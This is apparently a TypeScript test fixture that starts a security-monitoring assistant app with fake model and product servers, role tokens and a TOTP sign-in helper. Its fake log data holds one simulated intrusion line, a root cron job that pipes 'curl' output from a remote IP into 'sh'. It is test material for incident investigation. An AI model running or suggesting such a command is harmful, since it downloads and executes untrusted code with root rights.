// Starts the app on a random port for tests, with a fake model server and fake products that answer what the test sets.
import { createHmac } from "node:crypto";
import { createServer, type RequestListener, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { createAuth } from "@openasy/auth";
import { createApp, type AppOptions } from "./app.ts";
import { createAssistant, type AssistantOptions } from "./assistant.ts";
import { openDb } from "./db.ts";
import { fakeModel, fakeProducts, type FakeToken, type Scripted } from "./fakes.ts";
import { sealer } from "./seal.ts";

export const ADMIN_TOKEN = "test-admin-token";
export const T0 = Date.parse("2026-10-28T09:00:00Z");

/** Each person's own token in each fake product; the admin one can manage Logs. */
export const TOKENS: Record<string, FakeToken> = {
  oa_logs_victor0000000000000000: { product: "logs", person: "victor" },
  oa_logs_ada000000000000000000000: { product: "logs", person: "ada" },
  oa_logs_owner0000000000000000000: { product: "logs", person: "owner", admin: true },
  oa_siem_victor0000000000000000: { product: "siem", person: "victor" },
  oa_metrics_victor00000000000000: { product: "metrics", person: "victor" },
  oa_incidents_victor000000000000: { product: "incidents", person: "victor" },
};

export const line = (msg: string, over: Record<string, unknown> = {}) => ({
  time: "2026-10-28T03:12:04Z",
  msg,
  level: "info",
  host: "web-2",
  service: "cron",
  source: "journald",
  fields: {},
  ...over,
});

export async function startApp(
  opts: Partial<AppOptions> & { version: string; script?: Scripted[] | Parameters<typeof fakeModel>[0]; assistantOptions?: Partial<AssistantOptions> },
) {
  const db = openDb(":memory:");
  let now = T0;
  const model = await fakeModel(opts.script ?? [{ text: "Nothing to say." }]);
  // What each person may read differs: the products answer by whose token it is, as the real ones do by role.
  const lines: Record<string, unknown[]> = { victor: [line("CRON[812]: (root) CMD (curl -s http://198.51.100.7/x | sh)")], ada: [], owner: [] };
  const products = await fakeProducts(TOKENS, {
    "logs /api/v1/search": (_q, who) => ({
      body: { lines: lines[who.person] ?? [], start: "2026-10-28T02:00:00Z", end: "2026-10-28T09:00:00Z", truncated: false },
    }),
    "siem /api/v1/signals": () => ({
      body: {
        signals: [
          {
            id: "sig-1",
            rule: { id: "r1", title: "New cron entry", tags: [] },
            severity: "high",
            host: "web-2",
            status: "new",
            reason: null,
            changedBy: null,
            count: 1,
            firstSeen: "2026-10-28T03:12:00Z",
            lastSeen: "2026-10-28T03:12:00Z",
            incident: null,
          },
        ],
        nextCursor: null,
      },
    }),
    "metrics /prometheus/api/v1/query_range": () => ({
      body: {
        status: "success",
        data: {
          resultType: "matrix",
          result: [
            {
              metric: { instance: "web-2", job: "node" },
              values: [
                [1761620400, "0.2"],
                [1761620460, "0.97"],
                [1761620520, "0.25"],
              ],
            },
          ],
        },
      },
    }),
    "incidents /api/v1/incidents/*": (_q) => ({ status: 404, body: { code: "not-found", detail: "No such incident." } }),
  });
  const { assistantOptions, script: _script, ...appOptions } = opts;
  const assistant = createAssistant(db, { sealer: sealer(Buffer.alloc(32, 5)), clock: () => now, ...assistantOptions });
  // The origin is known once the port is, so the handler is set after listening.
  let handler: RequestListener = (_req, res) => res.writeHead(503).end();
  const http: Server = createServer((req, res) => handler(req, res));
  await new Promise<void>((resolve) => http.listen(0, resolve));
  const base = `http://localhost:${(http.address() as AddressInfo).port}`;
  const auth = createAuth({ db, product: "assistant", productName: "OpenAsy Assistant", origin: base });
  handler = createApp({ db, assistant, auth, adminToken: ADMIN_TOKEN, ...appOptions });
  const as =
    (token: string) =>
    (path: string, init: RequestInit = {}) =>
      fetch(base + path, { ...init, headers: { authorization: `Bearer ${token}`, "content-type": "application/json", ...init.headers } });
  const admin = as(ADMIN_TOKEN);
  const get = async (path: string) => (await (await admin(path)).json()) as any;
  const send = (method: string, path: string, body?: unknown) => admin(path, { method, ...(body !== undefined && { body: JSON.stringify(body) }) });
  const close = async () => {
    await Promise.all([model.close(), products.close(), new Promise<void>((resolve) => http.close(() => resolve()))]);
  };

  /** Sets a model at the fake server and allows the fake products as sources. */
  async function setUp(provider: "openai" | "anthropic" = "openai") {
    await send("PUT", "/api/v1/model", { provider, baseUrl: provider === "openai" ? `${model.url}/v1` : model.url, model: "llama3.1:8b" });
    for (const id of ["logs", "siem", "metrics", "incidents"])
      await send("PUT", `/api/v1/sources/${id}`, { allowed: true, apiUrl: `${products.url}/${id}`, webUrl: `https://${id}.example.com` });
  }

  /** The owner, signed in with a second factor, makes an API token for each role. */
  async function roles() {
    const jar = new Map<string, string>();
    const browser = async (path: string, body: unknown) => {
      const res = await fetch(base + path, {
        method: "POST",
        headers: { origin: base, cookie: [...jar].map(([k, v]) => `${k}=${v}`).join("; "), "content-type": "application/json" },
        body: JSON.stringify(body),
      });
      for (const c of res.headers.getSetCookie()) {
        const [pair] = c.split(";");
        const i = pair!.indexOf("=");
        jar.set(pair!.slice(0, i), pair!.slice(i + 1));
      }
      return res;
    };
    const setup = new URL(auth.setupLink()!).searchParams.get("setup");
    await browser("/api/v1/auth/setup", { token: setup, name: "Olivia", email: "owner@example.com", password: "correct horse battery staple 42" });
    const { secret } = (await (await browser("/api/v1/auth/me/totp", {})).json()) as { secret: string };
    await browser("/api/v1/auth/me/totp/confirm", { code: totp(secret) });
    const token = async (role: string) => ((await (await browser("/api/v1/auth/tokens", { name: role, role })).json()) as { token: string }).token;
    return { admin: as(await token("admin")), editor: as(await token("editor")), viewer: as(await token("viewer")) };
  }

  return { db, assistant, auth, model, products, lines, base, admin, get, send, close, roles, setUp, later: (ms: number) => (now += ms) };
}

function totp(secret: string) {
  const bits = [...secret].map((c) => "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567".indexOf(c).toString(2).padStart(5, "0")).join("");
  const key = Buffer.from(bits.match(/.{8}/g)!.map((b) => parseInt(b, 2)));
  const counter = Buffer.alloc(8);
  counter.writeBigUInt64BE(BigInt(Math.floor(Date.now() / 30_000)));
  const mac = createHmac("sha1", key).update(counter).digest();
  return String((mac.readUInt32BE(mac[19]! & 15) & 0x7fffffff) % 1_000_000).padStart(6, "0");
}
